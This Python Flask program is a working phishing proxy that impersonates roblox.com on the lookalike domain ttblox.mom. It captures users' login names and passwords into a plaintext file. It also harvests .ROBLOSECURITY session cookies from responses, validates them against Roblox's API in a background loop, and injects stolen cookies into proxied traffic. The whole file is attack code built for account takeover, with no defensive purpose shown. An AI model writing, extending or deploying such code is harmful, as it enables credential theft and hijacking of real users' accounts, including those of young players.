import os
import random
import threading
import re
import time
import json
from flask import Flask, request, Response, make_response
import requests
from werkzeug.middleware.dispatcher import DispatcherMiddleware
from urllib.parse import urlparse

HOST = '0.0.0.0'
PORT = 45594
COOKIE_FILE = 'cookie.txt'
AUTH_FILE = 'auth.txt'
ROBLOX_DOMAIN = 'roblox.com'
PROXY_DOMAIN = 'ttblox.mom'

app = Flask(__name__)

cookies_list = []
valid_cookies = set()
cookie_lock = threading.Lock()

def load_cookies():
    global cookies_list
    if not os.path.exists(COOKIE_FILE):
        with open(COOKIE_FILE, 'w') as f:
            f.write('')
        cookies_list = []
        return []
    
    with open(COOKIE_FILE, 'r') as f:
        cookies_list = [line.strip() for line in f.readlines() if line.strip()]
    return cookies_list

def load_auth():
    if not os.path.exists(AUTH_FILE):
        with open(AUTH_FILE, 'w') as f:
            f.write('')
        return []
    
    with open(AUTH_FILE, 'r') as f:
        auths = [line.strip() for line in f.readlines() if line.strip()]
    return auths

def save_auth(username, password):
    with open(AUTH_FILE, 'a') as f:
        f.write(f"{username}:{password}\n")

def get_random_cookie():
    with cookie_lock:
        if not valid_cookies:
            return None
        return random.choice(list(valid_cookies))

def validate_cookie(cookie):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Cookie': f'.ROBLOSECURITY={cookie}'
        }
        resp = requests.get('https://users.roblox.com/v1/users/authenticated/app-launch-info', 
                           headers=headers, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if 'id' in data and 'name' in data:
                return True
        return False
    except:
        return False

def validate_all_cookies():
    global cookies_list, valid_cookies
    while True:
        with cookie_lock:
            current_cookies = cookies_list.copy()
        
        new_valid_cookies = set()
        for cookie in current_cookies:
            if len(cookie) > 50 and validate_cookie(cookie):
                new_valid_cookies.add(cookie)
        
        with cookie_lock:
            valid_cookies = new_valid_cookies
        
        time.sleep(300)

def modify_response(resp):
    response = make_response(resp.content)
    
    for key, value in resp.headers.items():
        if key.lower() not in ['content-encoding', 'content-length', 'transfer-encoding']:
            response.headers[key] = value
    
    response.status_code = resp.status_code
    
    content_type = resp.headers.get('Content-Type', '')
    if 'text' in content_type or 'javascript' in content_type or 'json' in content_type or 'xml' in content_type:
        try:
            content = resp.content.decode('utf-8')
            response.set_data(content)
        except UnicodeDecodeError:
            pass  
    
    return response

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
def proxy(path):
    original_host = request.host
    
    subdomain = original_host.replace(f'.{PROXY_DOMAIN}', '')
    
    if subdomain == PROXY_DOMAIN:
        target_host = ROBLOX_DOMAIN
    else:
        target_host = f"{subdomain}.{ROBLOX_DOMAIN}"
    
    target_url = f"https://{target_host}/{path}"
    if request.query_string:
        target_url += f"?{request.query_string.decode('utf-8')}"
    
    headers = {header: value for header, value in request.headers.items()
               if header.lower() not in ['host']}
    headers['Host'] = target_host
    
    roblosecurity = get_random_cookie()
    if roblosecurity:
        headers['Cookie'] = f'.ROBLOSECURITY={roblosecurity}'
    
    try:
        resp = requests.request(
            method=request.method,
            url=target_url,
            headers=headers,
            data=request.get_data(),
            cookies=request.cookies,
            allow_redirects=False,
            stream=True
        )
        
        set_cookie_header = resp.headers.get('Set-Cookie')
        if set_cookie_header:
            cookie_match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie_header)
            if cookie_match:
                new_cookie = cookie_match.group(1)
                if len(new_cookie) > 50 and new_cookie not in cookies_list:
                    if validate_cookie(new_cookie):
                        with cookie_lock:
                            cookies_list.append(new_cookie)
                            valid_cookies.add(new_cookie)
                        with open(COOKIE_FILE, 'a') as f:
                            f.write(f"{new_cookie}\n")
        
        if resp.status_code in [301, 302, 303, 307, 308]:
            location = resp.headers.get('Location')
            if location:
                response = Response()
                response.status_code = resp.status_code
                response.headers['Location'] = location
                return response
        
        return modify_response(resp)
    
    except Exception as e:
        return f"Proxy error: {str(e)}", 500

@app.route('/auth/login', methods=['POST'])
def handle_login():
    try:
        login_data = request.get_json()
        if not login_data:
            return json.dumps({"errors": [{"code": 3, "message": "Username and Password are required."}]}), 400
        
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        resp = requests.post('https://auth.roblox.com/v2/login', 
                           json=login_data, headers=headers, timeout=10)
        
        if resp.status_code == 200:
            data = resp.json()
            if 'user' in data:
                set_cookie_header = resp.headers.get('Set-Cookie')
                if set_cookie_header:
                    cookie_match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie_header)
                    if cookie_match:
                        new_cookie = cookie_match.group(1)
                        if len(new_cookie) > 50 and new_cookie not in cookies_list:
                            if validate_cookie(new_cookie):
                                with cookie_lock:
                                    cookies_list.append(new_cookie)
                                    valid_cookies.add(new_cookie)
                                with open(COOKIE_FILE, 'a') as f:
                                    f.write(f"{new_cookie}\n")
                
                if 'password' in login_data and ('cvalue' in login_data or 'username' in login_data):
                    username = login_data.get('cvalue') or login_data.get('username', '')
                    password = login_data.get('password', '')
                    if username and password:
                        save_auth(username, password)
        
        response = make_response(resp.content)
        response.status_code = resp.status_code
        for key, value in resp.headers.items():
            if key.lower() not in ['content-encoding', 'content-length', 'transfer-encoding']:
                response.headers[key] = value
        return response
        
    except Exception as e:
        return json.dumps({"errors": [{"code": 0, "message": f"An unexpected error occurred: {str(e)}"}]}), 500

if __name__ == '__main__':
    load_cookies()
    load_auth()
    
    validator_thread = threading.Thread(target=validate_all_cookies, daemon=True)
    validator_thread.start()
    
    from gunicorn.app.base import BaseApplication
    
    class GunicornApp(BaseApplication):
        def __init__(self, app, options=None):
            self.options = options or {}
            self.application = app
            super().__init__()
        
        def load_config(self):
            for key, value in self.options.items():
                self.cfg.set(key.lower(), value)
        
        def load(self):
            return self.application
    
    options = {
        'bind': f'{HOST}:{PORT}',
        'workers': 8,
        'threads': 20,
        'worker_class': 'gthread',
        'timeout': 120,
    }
    
    GunicornApp(app, options).run()